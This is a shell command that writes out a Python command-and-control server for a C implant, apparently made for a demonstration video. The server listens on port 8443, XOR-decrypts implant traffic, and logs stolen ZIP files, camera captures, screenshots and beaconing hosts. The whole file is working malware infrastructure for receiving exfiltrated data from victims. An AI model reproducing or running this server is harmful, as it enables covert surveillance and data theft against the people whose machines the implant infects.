cat > ~/server.py << 'ENDOFFILE'
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

# Configuration
HOST = "0.0.0.0"
PORT = 8443
XOR_KEY = 0xAA

def xor_decrypt(data, key):
    """Decrypts XOR encrypted data from the C Implant"""
    return bytes([b ^ key for b in data])

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        # Decrypt the incoming payload
        decrypted_bytes = xor_decrypt(post_data, XOR_KEY)
        
        print("\n" + "="*60)
        print(" INCOMING CONNECTION FROM IMPLANT! ")
        print(f"Endpoint: {self.path}")
        
        try:
            # Try to parse the decrypted data as JSON
            json_data = json.loads(decrypted_bytes.decode('utf-8'))
            
            if self.path == "/register":
                data = json_data.get("data", {})
                zip_file = data.get("zip_file", "Unknown")
                camera = data.get("camera", "0")
                screenshot = data.get("screenshot", "0")
                
                print(f"[+] Stolen ZIP File:  {zip_file}")
                print(f"[+] Camera Status:     {'Captured' if camera == '1' else 'Failed/Not Found'}")
                print(f"[+] Screenshot Status: {'Captured' if screenshot == '1' else 'Failed'}")
                print("="*60 + "\n")
                
            elif self.path == "/poll":
                print(f"[+] Implant Beaconing: {json_data.get('id')} is alive and polling.")
                print("="*60 + "\n")
                
        except Exception as e:
            print(f"[!] Could not decode JSON. Raw data: {decrypted_bytes}")
            print("="*60 + "\n")

        # Send a 200 OK response back to the implant so it knows the data was received
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        # Suppress default HTTP logging to keep the terminal clean for the video
        pass

if __name__ == "__main__":
    print(" C2 Server starting...")
    print(f" Listening on http://{HOST}:{PORT}")
    print(" Waiting for encrypted connections...\n")
    
    server = HTTPServer((HOST, PORT), C2Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped.")
        server.server_close()
ENDOFFILE
